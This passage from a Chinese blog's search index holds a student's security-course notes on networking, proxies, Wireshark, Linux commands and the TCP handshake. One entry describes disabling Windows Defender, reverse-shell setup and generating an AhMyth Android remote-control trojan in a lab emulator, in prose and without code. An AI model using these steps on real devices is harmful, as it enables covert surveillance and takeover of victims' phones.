class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-id">#asd</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>: <span class="built_in">rgb</span>(<span class="number">146</span>, <span class="number">146</span>, <span class="number">160</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">float</span>: left;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin-bottom</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-id">#dfg</span> &#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">height</span>: <span class="number">100px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">font-size</span>: <span class="number">50px</span>;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">background-color</span>:<span class="built_in">rgb</span>(<span class="number">152</span>, <span class="number">127</span>, <span class="number">108</span>);</span></span><br><span class="line"><span class="language-css">        <span class="attribute">float</span><span class="selector-pseudo">:left</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">h3</span>&#123;</span></span><br><span class="line"><span class="language-css">        <span class="attribute">margin-bottom</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span>你好，世界<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;tf&quot;</span>&gt;</span>你好<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;asd&quot;</span>&gt;</span>我不好<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;dfg&quot;</span>&gt;</span>我怕不会<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>做了一个简单的布局，显示结果为：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701866643243-3f13f6ee-4d8b-4a06-b0b0-9ec8d84de91c.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> php动态网站的实现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> html,css和js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>介绍路由器,osi七层模型,代理和抓包工具的使用</title>
      <link href="/2023/12/05/ip,%E4%BB%A3%E7%90%86,OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B,wirshark%E6%8A%93%E5%8C%85/"/>
      <url>/2023/12/05/ip,%E4%BB%A3%E7%90%86,OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B,wirshark%E6%8A%93%E5%8C%85/</url>
      
        <content type="html"><![CDATA[<p>上午：</p><h2 id="介绍路由和ip"><a href="#介绍路由和ip" class="headerlink" title="介绍路由和ip"></a>介绍路由和ip</h2><p>介绍路由器和ip：<br>路由器(公网ip)<br>静态路由：确定的路径<br>动态路由：自动协商最优路径(最优解)</p><p>ip：静态ip<br>       动态ip(dhcp)，会过期，过期之后自动回收，终端重启之后会分配新的ip<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200456841.png" alt="image-20231210200456841"><br>在设置IP地址时需要注意：<br>静态设置好后，动态分配后一定在一段时间内上不了网<br>动态ip设置后，将其改变为静态IP可能上不了网</p><h2 id="代理的介绍"><a href="#代理的介绍" class="headerlink" title="代理的介绍"></a>代理的介绍</h2><p>代理软件提供socks5的节点，sock5只接受传输层的协议，不接受网络层的协议。例如ICMP,IPsec<br>tcp&#x2F;ip协议：<br>TCP&#x2F;IP协议族包含许多其他协议和标准，如HTTP、FTP、SMTP等，它们提供了在Internet上进行各种通信和数据传输的基础。<br>简单介绍osi七层协议：<br>应用层   qq<br>表示层    数据解密<br>会话层      确保数据在通信中的同步        会话层<br>传输层      负责端到端的可靠传输和流量控制(TCP，udp)<br>网络层      网络之间传输数据包，处理逻辑地址(IP地址)，路由选择<br>数据链路层   处理物理地址(MAC)和错误检测<br>物理层  负责传输比特流，包括电学，光学和机械接口等物理特性<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200525319.png" alt="image-20231210200525319"></p><h2 id="昨天ipv4的补充："><a href="#昨天ipv4的补充：" class="headerlink" title="昨天ipv4的补充："></a>昨天ipv4的补充：</h2><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200546345.png" alt="image-20231210200546345"><br>分了地址块，要是有两个子网段一个大，一个小就会可能出现重复的IP地址此时就需要去找MAC地址<br>子网掩码的计算与使用：&#x2F;24就是子网掩码，IP地址包括网络位和主机位，子网掩码越小主机位越多。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200602432.png" alt="image-20231210200602432"><br>路由：<br>静态路由:手动配置路由表<br>动态路由：OSPF动态配置路由表<br>路由表包含：源ip&#x2F;mac，目的ip&#x2F;mac 四象限<br>交换机：集线器<br>正面：一个口<br>反面：网卡，多个口<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200624455.png" alt="image-20231210200624455"><br>简单解释一下，在一般情况下pc1是无法ping通pc2的，因为路由器相当于一堵防火墙挡住了他们之间的通信。但是如上图所呈现的将路由器1的路由表手动设置一个能够到达路由器2，而由于路由器之间的路由协议会去记录路由器1的ip与MAC地址，之后就能够使pc1 ping通pc2。</p><p>下午：</p><h2 id="windows手动配置ip"><a href="#windows手动配置ip" class="headerlink" title="windows手动配置ip"></a>windows手动配置ip</h2><p>此次过程是很简单的，打开控制中心<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701776831437-6da915ec-b6d5-4850-a020-8d7b910c5cc5.png" alt="image.png"><br>找到网络和共享中心，点击更改适配器设置，找到当前所使用的网卡，右键属性，找到TCP&#x2F;IPV4这个协议双击点开，点击使用下面的IP地址就可以进行更改自己的IP了，但是建议不要随便修改可能会使自己的终端无法连上网络。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701776909144-5db2cfe2-b1e2-4078-b02b-292033742fce.png" alt="image.png"></p><h2 id="vmmare-workstation网络模式"><a href="#vmmare-workstation网络模式" class="headerlink" title="vmmare workstation网络模式"></a>vmmare workstation网络模式</h2><p>wifi模块               有线网卡(接网线的接口)<br>驱动<br>官网查找驱动下载<br>三种网络模式：<br>桥接：出来物理机的IP之外都有可能 pc1连接vm0之间连接WiFi模块<br>仅主机：断网<br>nat(地址转换)：出口只有一个物理机的ip<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200716701.png" alt="image-20231210200716701"><br>pc2&#x3D;&gt;nat(路由器)&#x3D;&gt;一个物理机的ip<br>如图所示可知pc1是桥接模式，pc2和pc3是nat模式，那么它们之间的连接情况是咋样的呢？<br>pc1不能连pc2，pc3<br>pc2，pc3能连pc1<br>pc2能连pc3</p><h2 id="代理以及代理工具的使用"><a href="#代理以及代理工具的使用" class="headerlink" title="代理以及代理工具的使用"></a>代理以及代理工具的使用</h2><p>1.clash的使用：<br>设置端口为7890，打开允许局域网接入clash，如图所示设置<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701777394860-e74f79e2-f8b8-4f02-bd33-1518417ab90e.png" alt="image.png"><br>edge代理设置<br>点开edge，找到三个点，打开扩展，获取Microsoft的扩展，搜索<img src="https://cdn.nlark.com/yuque/0/2023/png/40666686/1701777572603-4ea971b1-ace8-4d12-b584-b155d58ebd86.png#averageHue=%23185674&clientId=u81765de4-30f6-4&from=paste&id=u76b455a5&originHeight=48&originWidth=48&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=1173&status=done&style=none&taskId=u42f72f18-1a63-4c2a-9fc7-54408a60099&title=" alt="image.png"><br>Proxy SwitchyOmega，获取拓展，安装完成之后打开拓展找到打开并固定Proxy SwitchyOmega，点击选项打开入图所示界面：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701777736814-d5e4ec8d-0bfc-4e43-b64d-78e6aa77b6d2.png" alt="image.png"><br>点击新建情景模式，名字随便取，按照如图设置就可以将上图配置的clash接入浏览器中。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701777892456-65402b09-d24e-4aa9-a2f4-ff52421d6fb7.png" alt="image.png"><br>同理火狐浏览器也是一样，由于火狐自带的有foxyProxy，只需要按照如图去设置就行<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701778035827-53bcf959-251b-4637-b715-cc8c70de1368.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701778124230-6727c02c-2d7c-45d7-838c-f1b746792878.png" alt="image.png"><br>浏览器能够使用代理的原理：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200735333.png" alt="image-20231210200735333"><br>proxi使用：<br>打开老师发送的地址<a href="http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/proxifier_137484.rar">http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/proxifier_137484.rar</a><br>通过这个地址可以下载proxi代理工具，下载完成之后解压并用管理员身份打开，界面如图所示<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701778476702-e0112ed3-b1e9-4ac3-a427-70f23af2becc.png" alt="image.png"><br>打开配置文件，点击代理服务器，添加，按照如图设置点击确认即可。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701778581379-739d7fb0-35f1-4a12-bad5-fcfff97312d0.png" alt="image.png"><br>打开配置文件，打开代理规则，删除本地的规则，建立一个全新自己的规则<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701778767451-fd0f131b-0c54-4118-97b9-c5adabdf6c30.png" alt="image.png"><br>设置为之后代理规则的界面应该为，点击确认即可。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701778819759-56133eea-1a3d-4fe4-a389-da5e09fdeba3.png" alt="image.png"><br>此时进行测试，按上win+r，输入cmd命令。再次输入ssh <a href="mailto:&#114;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#x2e;&#x31;&#x2e;&#x31;&#x2e;&#x31;">&#114;&#x6f;&#x6f;&#x74;&#x40;&#x31;&#x2e;&#x31;&#x2e;&#x31;&#x2e;&#x31;</a><br>此时会显示连接失败，但是问题不大，查看proxi上面的信息可以看到ssh.exe，而且ssh.exe 服务在第五层会话层，此时进行过连接说明配置成功。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701779020546-41aa34f7-88ec-4bd7-b278-8fd436b4d5fa.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701779037617-fd6e0a39-d503-4c2f-8931-de2cb45c6b58.png" alt="image.png"><br>也可以对steam进行测试，打开steam结果为<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701779197766-b3285c9f-62e4-4cf3-99e5-546bcc21407d.png" alt="image.png"><br>能够成功进入，proxi上面显示：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701779243129-c53a1afe-1652-4914-9c65-a5f3c49328ea.png" alt="image.png"></p><h2 id="wireshark抓包工具的使用"><a href="#wireshark抓包工具的使用" class="headerlink" title="wireshark抓包工具的使用"></a>wireshark抓包工具的使用</h2><p>打开链接：<br><a href="http://192.168.2.6:5244/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Wireshark-win64-3.0.0%E4%B8%AD%E6%96%87%E7%89%88.exe">http://192.168.2.6:5244/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E8%BD%AF%E4%BB%B6%E5%A4%A7%E5%85%A8/Wireshark-win64-3.0.0%E4%B8%AD%E6%96%87%E7%89%88.exe</a><br>下载wireshark(抓网卡的包)抓包工具，切记此版本目前只能在Windows10上面进行运行，当运行到windows11时会显示没有接口，需要进行更新，更新之后一样可以运行成功，因为winpcap版本太低也就是驱动程序版本太低导致无法识别win11的接口。<br>双击打开wireshark，界面如图所示，如果是虚拟机就是端口0<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701779667773-ce2705f2-0933-4c90-9d5b-328ad14e5d09.png" alt="image.png"><br>找到自己当前物理机联网的形式，比如WLAN，双击进入，可以输入http，tcp进行查看，这里展示tcp结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701779844552-48d7ae85-a83b-4133-b2c4-7aa8ffacaa52.png" alt="image.png"><br>启动命令行，开ping 192.168.2.45<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701779943879-e7e5d789-75d3-4646-96da-297ee1b35d00.png" alt="image.png"><br>输入icmp，查看去，回的次数<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701780165787-81314540-2f33-4c86-952b-e86b296b7a4e.png" alt="image.png"><br>DNS大小默认为78bit，大于78小于130<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701780307553-4786e68d-a13a-4363-852e-b04c3408c2a9.png" alt="image.png"><br>最后简单介绍tcp三次握手，四次挥手的过程：<br>TCP（传输控制协议）是一种在计算机网络中用于可靠传输的协议。<br>三次握手（establishment）：</p><ol><li>第一次握手：客户端发送一个带有 SYN（同步）标志的 TCP 包，用于请求建立连接。此时客户端进入 SYN-SENT（同步已发送）状态。</li><li>第二次握手：服务器收到请求后，会回复一个带有 SYN&#x2F;ACK（同步&#x2F;确认）标志的 TCP 包，表示收到请求并同意建立连接。同时服务器会为该连接分配资源。此时服务器进入 SYN-RECEIVED（同步已接收）状态。</li><li>第三次握手：客户端收到服务器的回复后，会发送一个带有 ACK（确认）标志的 TCP 包，表示客户端收到了服务器的确认，并向服务器发送一个确认请求。该包发送完毕后，客户端和服务器都进入 ESTABLISHED（已建立连接）状态，连接建立成功。</li></ol><p>四次挥手（termination）：</p><ol><li>第一次挥手：当客户端或服务器的其中一方决定关闭连接时，它会发送一个带有 FIN（结束）标志的 TCP 包，表示请求关闭连接。发送方进入 FIN-WAIT-1（等待对方的结束请求）状态。</li><li>第二次挥手：接收方收到结束请求后，会发送一个带有 ACK（确认）标志的 TCP 包，表示收到请求。发送方进入 FIN-WAIT-2（等待对方的结束确认）状态。此时连接只是半关闭状态，即接收方仍可以发送数据。</li><li>第三次挥手：接收方发送完数据后，会发送一个带有 FIN（结束）标志的 TCP 包，表示它也准备关闭连接。接收方进入 LAST-ACK（最后确认）状态。</li><li>第四次挥手：发送方收到结束请求后，会发送一个带有 ACK（确认）标志的 TCP 包，表示收到结束请求的确认。发送方进入 TIME-WAIT（等待时间）状态，等待一段时间后关闭连接。接收方收到确认后，也关闭连接。<br>需要注意的是，四次挥手完成后，客户端和服务器都进入 CLOSED（已关闭）状态，连接彻底关闭。这里的时间等待（TIME-WAIT）状态是为了防止最后的 ACK 包在网络中丢失，确保连接的可靠关闭。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 路由交换,网络基础(补) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ip,代理,OSI七层模型,wirshark抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复盘上周知识，介绍基本网络信息</title>
      <link href="/2023/12/04/%E5%9B%9E%E9%A1%BE,%E6%AD%A3%E5%8F%8Dshell,%E6%89%8B%E6%9C%BA%E8%BF%9C%E6%8E%A7/"/>
      <url>/2023/12/04/%E5%9B%9E%E9%A1%BE,%E6%AD%A3%E5%8F%8Dshell,%E6%89%8B%E6%9C%BA%E8%BF%9C%E6%8E%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="永恒之黑漏洞的回顾："><a href="#永恒之黑漏洞的回顾：" class="headerlink" title="永恒之黑漏洞的回顾："></a>永恒之黑漏洞的回顾：</h2><p>上午：<br>    发了一个自动关闭Windows10防火墙的一个exe，名字叫做StopDefender.exe，由于本机是Windows11，所以无法进行演示，不过可以运行一下来查看效果。<br>       在Windows11上面运行会无法打开命令行,会闪一下。而要去进行永恒之黑漏洞的实现是需要关掉两台机器上面的防火墙以及实施保护。否则就会win10hei虚拟机无法蓝屏导致失败，而且win10hei虚拟机不要去更新，因为cve的漏洞是在1903-1906之间，win10系统太新的话会导致实验失败。由于已经做过一遍永恒之黑的漏洞这里就不演示了。</p><p>还介绍了三个网站cnvd，cnnvd还有cve：<br>CNVD ：CNVD是指”中国国家信息安全漏洞库共享平台”（China National Vulnerability Database）<br>官网地址是：<a href="https://www.cnvd.org.cn/">https://www.cnvd.org.cn/</a><br>CNNVD：CNNVD 是指”国家安全漏洞库”,它的主要职责是收集、分析和发布与中国相关的安全漏洞信息。它提供了大量的漏洞信息，包括漏洞的描述、威胁级别评估、影响范围、修复建议等。通过查询 CNNVD，用户可以获取最新的漏洞信息，以了解各种 IT 系统和应用程序中存在的安全风险，并采取相应的安全措施。<br>官网地址是：<a href="https://www.cnnvd.org.cn/home/childHome">https://www.cnnvd.org.cn/home/childHome</a><br>cve：CVE（Common Vulnerabilities and Exposures，通用漏洞和公开漏洞）是一个公开的漏洞标识系统。CVE的目标是为全球范围内的软件、硬件和系统漏洞提供唯一的标识符，以便于在安全社区中进行讨论、共享和协调漏洞信息。<br>CVE的标识符采用”CVE-年份-编号”的格式，例如”CVE-2023-1234”。每个CVE标识符都与一个特定的漏洞相关，并包含了漏洞的描述、严重程度、影响的软件和设备等信息。此外，CVE还促进了漏洞披露和漏洞修复的协作，提高了整体的网络安全性。<br>官网地址是：<a href="https://cve.mitre.org/">https://cve.mitre.org/</a></p><p>远控规则：<br>服务端                                     客户端<br>反弹shell：<br>服务端开一个端口监听127.0.0.1   8888<br>木马配置：服务器的IP 端口就是8888<br>正向shell：正向shell可能会出现bug，是因为由于windows 防火墙(IP table)或者Linux的防火墙抵御来自sever的监听。但是反向shell不会，因为反向shell是客户机c出栈，正向shell是入栈。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701689287512-3f14f735-d3a1-4f7e-9aca-7d50809757f0.png" alt="image.png"><br>尝试了一下去ping其他人的IP地址发现防火墙没关，无法去进行ping通，但是有些人是可以拼通的，主要原因是防火墙出现了bug，解决防火墙抵御bug的解决方法，直接关闭防火墙或者在防火墙高级设置中允许连接<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701689541697-75f029ac-9eba-4a3c-8649-44dc7c99079c.png" alt="image.png"></p><p>下午：</p><h2 id="演示安卓远程操控查看相关信息"><a href="#演示安卓远程操控查看相关信息" class="headerlink" title="演示安卓远程操控查看相关信息"></a>演示安卓远程操控查看相关信息</h2><p>安装一款安卓模拟器，mumu模拟器，下载mumu6，不要去下载mumu12，因为木马程序的版本较低可能会无法进行进行远控。下载地址为：<a href="https://mumu.163.com/">https://mumu.163.com/</a><br>下载安卓远程工具AhMyth.exe<br>这两个都下载好后打开mumu模拟器，安装后打开会弹出Hyper-V的弹窗，如果之前是打开的会提示关闭之后重启就好了打开之后进行正常的界面<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701690424395-0c2d4b06-e5ab-4571-94fd-6306e530c9df.png" alt="image.png"><br>打开AhMyth.exe，用管理员的方式打开，输入IP地址<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701690541004-87b4135f-1622-4ee9-b3df-dcba83be6441.png" alt="image.png"><br>在下面会显示生成木马的路径，点击mumu模拟器的+APP按钮就可以将其添加到桌面上。生成app不成功的原因，病毒原因和权限原因<br>环境变量上面的优先级最高<br>java版本太高会失败，自己下载的时候是java8.0.31的版本<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701690662345-43e84128-937e-475c-b1e2-5c1c1cab673c.png" alt="image.png"><br>在AhMyth.exe上开启监听，点开此app就会连接成功，就可以进入这个界面。照相拍到图片无法显示，是由于火绒进行了拦截，也可虚拟定位等等进行操作，整体上而言还是功能还是比较少的，期待进一步完善。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701690820715-e0561fde-2b2a-4049-9553-003e5bca2269.png" alt="image.png"><br>下午还讲解了一下用txt写python代码直接在命令行运行的过程：<br>首先安装python3.12版本，前面两个勾上，选择安装路径缺什么模块安装什么模块<br>vscode编写python代码安装python插件，不要安装太多，插件会混乱的，而且这些在前面已经介绍过就不再演示了</p><h2 id="网络基本知识"><a href="#网络基本知识" class="headerlink" title="网络基本知识"></a>网络基本知识</h2><p>按上win+r输入ipconfig查看到相关网络信息，<br>以太网适配器：有线插槽<br>virtual box ：虚拟网卡<br>zero tier one ：虚拟局域网的软件</p><p>ipv6:128位二进制数字组成<br>介绍：<br>：：：：：<br>有多个零接在一起，抽长的缩短<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701691456224-fa535016-8f03-4285-a60d-f2c6ad38f705.png" alt="image.png"><br>ipv6测试：<a href="https://ipv6ready.me/">https://ipv6ready.me</a></p><p>ipv4：32个二进制的数字组成<br>192.168.1.1<br>a   b   c    d<br>255.255.255.255&#x2F;24   前面是IP地址，后面是子网掩码<br>.255广播地址<br>.254<br>.253<br>.252网关</p><p>公网(外网)ip                                     私网(内网)ip<br>                                                        IP地址分段<br>                                                  任何人都可以用的ip地址<br>下图是公网ip范围：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200006484.png" alt="image-20231210200006484"><br>下图是私网ip范围：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701691693536-3e2ae7aa-e685-45ef-9aca-bcc3c99e4101.png" alt="70c7f93372aac18f330d87b7d3a4dae.png"><br>局域网的实现如图所示：<br>光猫：光信号转换为电信号，通过光猫对内外网地址进行转换，从而实现通信<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200042916.png" alt="image-20231210200042916"><br>学校局域网的实现：<br>通过局域网自己配置交换机和路由器实现减本增效的结果。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200103422.png" alt="image-20231210200103422"></p>]]></content>
      
      
      <categories>
          
          <category> 远控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 回顾,正反shell,手机远控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络基本知识</title>
      <link href="/2023/12/04/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/12/04/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h2 id="网络基本知识"><a href="#网络基本知识" class="headerlink" title="网络基本知识"></a>网络基本知识</h2><p>按上win+r输入ipconfig查看到相关网络信息，<br>以太网适配器：有线插槽<br>virtual box ：虚拟网卡<br>zero tier one ：虚拟局域网的软件</p><p>ipv6:128位二进制数字组成<br>介绍：<br>：：：：：<br>有多个零接在一起，抽长的缩短<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701691456224-fa535016-8f03-4285-a60d-f2c6ad38f705.png" alt="image.png"><br>ipv6测试：<a href="https://ipv6ready.me/">https://ipv6ready.me</a></p><p>ipv4：32个二进制的数字组成<br>192.168.1.1<br>a   b   c    d<br>255.255.255.255&#x2F;24   前面是IP地址，后面是子网掩码<br>.255广播地址<br>.254<br>.253<br>.252网关</p><p>公网(外网)ip                                     私网(内网)ip<br>                                                        IP地址分段<br>                                                  任何人都可以用的ip地址<br>下图是公网ip范围：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200006484.png" alt="image-20231210200006484"><br>下图是私网ip范围：<br><img src="/%E7%BD%91%E7%BB%9C%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86.assets/1701691693536-3e2ae7aa-e685-45ef-9aca-bcc3c99e4101.png" alt="70c7f93372aac18f330d87b7d3a4dae.png"><br>局域网的实现如图所示：<br>光猫：光信号转换为电信号，通过光猫对内外网地址进行转换，从而实现通信<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200042916.png" alt="image-20231210200042916"><br>学校局域网的实现：<br>通过局域网自己配置交换机和路由器实现减本增效的结果。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20231210200103422.png" alt="image-20231210200103422"></p>]]></content>
      
      
      <categories>
          
          <category> 网络基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos-minimal虚拟机命令</title>
      <link href="/2023/12/01/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/12/01/Linux%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>一:<br>上午：下载CentOS-7.9-x86_64-Minimal-2009.iso,也就是kali的iso镜像，下载地址为：<br><a href="http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E9%95%9C%E5%83%8F%E5%A4%A7%E5%85%A8/CentOS-7-x86_64-Minimal-2009.iso">http://192.168.2.6:5244/d/%E7%BD%91%E7%9B%98/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98/%E9%95%9C%E5%83%8F%E5%A4%A7%E5%85%A8/CentOS-7-x86_64-Minimal-2009.iso</a><br>由于我们之前已经安装过vmmare虚拟机，所以这里就不介绍，点开vmmare虚拟机，点开文件新建虚拟机，点击典型，下一步，找到自己的iso镜像路径。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701429239094-7807a184-e910-43e1-9f9b-80f99616cf5c.png" alt="image.png"><br>接着下一步，点击完成。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701429420013-e27dcda6-73cd-4dd5-aa77-d79e1578afb3.png" alt="image.png"><br>点击虚拟机等待配置完成，安装源选择磁盘，打开wifi，选择中文，输入密码，简单需要输入两次，完成即可进入到centos虚拟机的界面。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701429975903-55ec11fd-01a3-472d-8ea9-d1e63d240be5.png" alt="image.png"><br>如上图所示，初次进入是这个界面。<br>输入以下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls查看文件</span><br><span class="line">ls / 查看根目录文件</span><br><span class="line">ls -a </span><br><span class="line">隐藏文件.xxxxx  </span><br><span class="line">ls -a 查看隐藏文件 </span><br><span class="line">ls .当前目录</span><br><span class="line">ls ..上一级目录</span><br><span class="line">touch 文件名 </span><br><span class="line">touch .文件名 创建隐藏文件</span><br><span class="line">ls -al 查看隐藏文件和所有权限</span><br></pre></td></tr></table></figure><p>依次输入以上命令，出现如下结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701431129419-874359fa-8931-4809-864e-50a5b17f9476.png" alt="image.png"><br>text1和.text2是刚刚创建的文件，当输入ls时发现并没有.text2的文件。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701431283233-3302a065-5a9e-450e-8a55-c1f287087e9f.png" alt="image.png"><br>对ls -al的解读按照顺序如下图所示：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701431428757-08f8d583-9449-4b88-ab65-defbab736095.png" alt="image.png"><br>文件分为可执行文件和文本编辑文件<br>mkdir -p 递归创建t1&#x2F;t2&#x2F;t3 从根目录开始的绝对路径<br>输入cd t1,依次输入ls可以看到效果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701431652538-c106c34f-5be6-4b0e-a8a7-dc6b2d8ff1a5.png" alt="image.png"><br>cd  &#x2F;切换到根目录，输入 ls查看文件<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1701431939188-3445e846-26ed-4f56-b6b9-5eb83f23f587.png" alt="image.png"><br>所含文件的内容：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bin 放二进制文件</span><br><span class="line">dev 放磁盘文件</span><br><span class="line">tmp 临时文件</span><br><span class="line">boot 放驱动文件</span><br><span class="line">etc 放编辑文件</span><br><span class="line">home 存储用户个人信息文件</span><br><span class="line">sbin 放置系统管理的备用程序</span><br><span class="line">var 放日志文件</span><br></pre></td></tr></table></figure><p>下午：<br>输入如下命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami  显示用户名</span><br><span class="line">id      显示用户的ID，以及所属群组的ID</span><br><span class="line">pwd   显示当前目录</span><br><span class="line">rm -f 强制删除</span><br><span 